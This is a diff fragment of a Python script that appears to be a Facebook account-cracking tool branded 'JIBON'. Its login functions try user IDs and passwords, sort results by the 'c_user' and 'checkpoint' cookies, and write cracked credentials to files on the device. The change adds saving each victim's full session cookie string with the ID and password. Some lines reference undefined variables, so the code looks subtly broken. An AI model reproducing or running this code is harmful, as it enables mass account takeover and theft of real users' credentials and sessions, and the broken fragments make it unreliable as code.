@@ -374,7 +374,7 @@ def a(uid,pwx,tl):
                 open('/sdcard/JIBON-OK.txt', 'a').write(uid+' | '+ps+'\n')
                 oks.append(uid)
                 break
-            else:
+            elif 'checkpoint' in log_cookies:
                 coki=";".join([key+"="+value for key,value in session.cookies.get_dict().items()])
                 uid = "1000"+coki1[0:11]
                 #print(f'\r\33[1;92m [JIBON-CP] '+uid+' | '+ps+'\33[0;92m')
@@ -437,17 +437,18 @@ def m2(uid,pwx,tl):
             log_cookies=session.cookies.get_dict().keys()
             if 'c_user' in log_cookies:
                 coki=";".join([key+"="+value for key,value in session.cookies.get_dict().items()])
-                uid = "1000"+coki1[0:11]
+                idf = coki[65:80]
                 print(f'\r\33[1;92m [JIBON-OK] '+uid+' | '+ps+'\33[0;92m')
-                #print(f'\r\033[1;37m [COOKIES] '+coki)
-                open('/sdcard/JIBON-OK.txt', 'a').write(uid+' | '+ps+'\n')
+              #  print(f'\r\33[35;1m [COOKIES] '+coki)
+           #     cek_apk(session,coki)                
+                open('/sdcard/JIBON-OK.txt', 'a').write(cid+' | '+ps+' | '+coki+'\n')
                 oks.append(uid)
                 break
-            else:
+            elif 'checkpoint' in log_cookies:
                 coki=";".join([key+"="+value for key,value in session.cookies.get_dict().items()])
-                uid = "1000"+coki1[0:11]
-                #print(f'\r\33[1;92m [JIBON-CP] '+uid+' | '+ps+'\33[0;92m')
-                open('/sdcard/JIBON-CP.txt', 'a').write(uid+' | '+ps+'\n')
+                idf = coki[82:97]
+                #print(f"\33[1;91m[JIBON-CP] {uid} | {ps}")
+                open('/sdcard/JIBON-CP.txt', 'a').write( uid+' | '+ps+' \n')
                 cps.append(uid)
                 break
             else:
